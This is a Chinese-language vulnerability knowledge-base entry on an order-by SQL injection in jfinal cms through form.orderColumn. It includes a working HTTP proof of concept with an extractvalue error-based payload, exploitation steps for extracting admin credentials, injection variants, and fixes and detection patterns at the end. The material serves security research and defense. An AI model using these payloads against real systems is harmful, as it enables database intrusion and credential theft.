---
id: web-generic-sqli-jfinalcms-baseform-orderby-extractvalue
title: jfinal cms 列表接口 form.orderColumn 拼进 order by：报错注入 extractvalue 回显数据库口令
type: scenario
domain: web
path: web/generic/sqli
technique: jfinalcms-baseform-orderby-error-sqli
aliases:
- jfinal cms SQL 注入
- BaseForm getOrderBy 注入
- form.orderColumn 注入
- extractvalue 报错注入
- orderBy 拼接
tags:
- java
- sqli
- order-by
- error-based
- cms
- jfinal
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W2
  verified_at: '2026-11-08T12:05:10+08:00'
  notes: 已对照原文核对：BaseForm.getOrderBy() 返回 ' '+orderColumn+' '+orderAsc、ArticleController.list 拼 order by、payload form.orderColumn=%2b+0+and+(extractvalue(...))%23 与原文一致；500 页回显 XPATH syntax error 见原文截图；原文未标注受影响版本，未设 affected_versions；PoC 未在本机执行（需 Tomcat/MySQL 环境）
---

## 一句话结论

jfinal cms 的 `BaseForm.getOrderBy()` 把请求里的 `form.orderColumn`、`form.orderAsc` 原样拼成 `" " + orderColumn + " " + orderAsc + " "`，各列表接口再 `sql.append(" order by t.").append(orderBy)` 交给 `Db.query` 执行；因为 `orderColumn` 前面只有 `t.` 前缀、没有引号包裹，注入 `+ 0 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))#` 即可让 MySQL 报错把结果带进页面。

## 原理

- **拼接点在“框架基类”而非某个业务接口**：`BaseForm` 是所有后台列表共用的表单模型，`getOrderBy()` 只要 `orderColumn` 非空就返回 `" " + orderColumn + " " + orderAsc + " "`。任何调用 `getBaseForm().getOrderBy()` 并拼进 SQL 的控制器都自动继承该缺陷。
- **为什么前缀 `t.` 不构成防护**：最终语句形如 `... order by t.` + `orderColumn` 的内容 + ` ` + `orderAsc`。`orderColumn` 一旦以 `#` 结尾把后面全部注释，前缀 `t.` 只是紧贴在注入负载前面；原文的 `orderColumn=+ 0 and (extractvalue(...))#` 先用一元 `+ 0` 让 `t.+0` 成为合法表达式起点，再 `and` 接注入、`#` 注释掉 `orderAsc` 与尾随空格，从而在不破坏语句结构的前提下执行子查询。
- **报错注入可行**：`extractvalue(1, concat(0x7e,(select user()),0x7e))` 会因为 XPath 参数里含非法字符而抛出 `XPATH syntax error: '~root@localhost~'`，异常消息被 jfinal 的错误渲染直接写回页面（原文截图里的 500 页面就带着 `java.sql.SQLException: XPATH syntax error: 'root@localhost'`）。
- **为什么用 `user()` 而不是 `select ... from`**：报错注入的 concat 里可以直接放子查询，但长度受 `extractvalue` 参数长度限制（约 32 字符），实战中按字段分段读取。
- **`PreparedStatement` 在这里无效**：`Db.query(sql)` 虽然内部用 `pst.executeQuery`，但整条 SQL（包括 `order by` 部分）已经作为完整字符串拼好，预编译只能保护参数占位符，保护不了拼接进语句结构的片段。

## 触发条件

- jfinal cms 处于受影响版本（`BaseForm` 未对 `orderColumn` 做列名白名单）。
- 攻击者能访问后台列表接口（多数接口要求登录，部分前台接口也复用同一基类；原文以管理员会话演示）。
- 后端为 MySQL（`extractvalue` 报错注入依赖 MySQL 的 XPath 函数；其它库需换 `updatexml`、`cast`、`geometrycollection` 等）。
- 页面会把异常消息渲染出来（jfinal 的 `renderError`/`Error500` 模板默认回显异常）。

## 利用步骤

1. 登录后台（或找到未授权可访问的列表接口），抓 `POST /admin/article/list` 一类请求。
2. 确认参数名：`form.orderColumn`、`form.orderAsc`，以及 `attr.folder_id`、`attr.title`、`attr.status`、`totalRecords`、`pageNo`、`pageSize` 等分页参数。
3. 用 `form.orderColumn=%2b+0+and+(extractvalue(1,concat(0x7e,(select+user()),0x7e)))%23` 发送，观察 500 页面是否带出 `XPATH syntax error`。
4. 依次替换子查询：`select database()`、`select version()`、`select @@version_compile_os`，再读 `information_schema.tables` 找 `sys_user` 一类表。
5. 分段读管理员口令/会话配置：`select concat(username,0x3a,password) from sys_user limit 1`（超长时分两次 concat 或用 `substr`）。
6. 拿到数据库口令后结合 `db.properties`/`filemanager` 任意文件读取扩大战果。

## PoC

```http
POST /jfinal_cms/admin/article/list HTTP/1.1
Host: target:8081
Content-Type: application/x-www-form-urlencoded

form.orderColumn=%2b+0+and+(extractvalue(1,concat(0x7e,(select+user()),0x7e)))%23&form.orderAsc=&attr.folder_id=256&attr.title=&attr.status=1&totalRecords=1&pageNo=1&pageSize=20&length=10
```

响应中出现：

```text
java.sql.SQLException: XPATH syntax error: '~root@localhost~'
```

即证明注入成立；把 `(select user())` 换成 `(select database())` 等逐步取数据。

## 变体与关联

- 变体：`updatexml(1,concat(0x7e,(select ...),0x7e),1)`、`cast(1 as int)` + `exp(~(select ...))` 都可用于 MySQL 报错注入，取决于版本与过滤。
- 变体：`orderColumn` 若被列名白名单校验，改从 `orderAsc` 注入（它同样被拼进 SQL，且常只允许 `asc/desc` 之外不做校验）；或改用 `attr.title` 之类的 `whereLike` 参数（预编译则无效，需看是否拼接）。
- 变体：盲注场景（页面不报错）时用 `order by (select case when ... then 1 else 1/0 end)` 让排序报错/延迟。
- 边界：`t.` 前缀后接 `+ 0` 的表达式能否被 MySQL 接受与版本/解析上下文有关；原文在 MySQL 8 环境下回显了 `XPATH syntax error: 'root@localhost'`，若目标版本直接报语法错误，说明解析器在 `t.` 处就停了，此时改用 `orderAsc` 注入、或把 `orderColumn` 换成可独立成表达式的形式（如 `(select 1 from (select extractvalue(...))x)`）再试。
- 关联：[[web-generic-sqli-java-identifier-table-order-by-injection]]（同类 Java 列名拼接）、[[web-generic-sqli-pagevo-sort-orderby-pagesql-injection]]（`PageVo.getOrderBy` 的框架级同类缺陷）、[[web-generic-sqli-oa-jsp-orderby-sort-updatexml]]。

## 检测与防御

- 修复：`orderColumn` 必须与允许排序的列名做白名单比对（映射表：`create_time → t.create_time`），`orderAsc` 只接受 `asc/desc`；禁止把请求字段直接拼进 SQL 结构。
- 加固：列表查询改用 jfinal 的 `Db.paginate` + 参数化 where；`order by` 固定在后端定义，不从表单读。
- 检测：请求体中出现 `form.orderColumn` 且值包含 `(`, `)`, `0x7e`, `extractvalue`, `updatexml`, `#`；响应 500 页面回显 `XPATH syntax error` / `SQLException`。
- 响应：确认注入后按数据库凭据泄露处置，轮换 DB 账号、审计同库其它写操作。
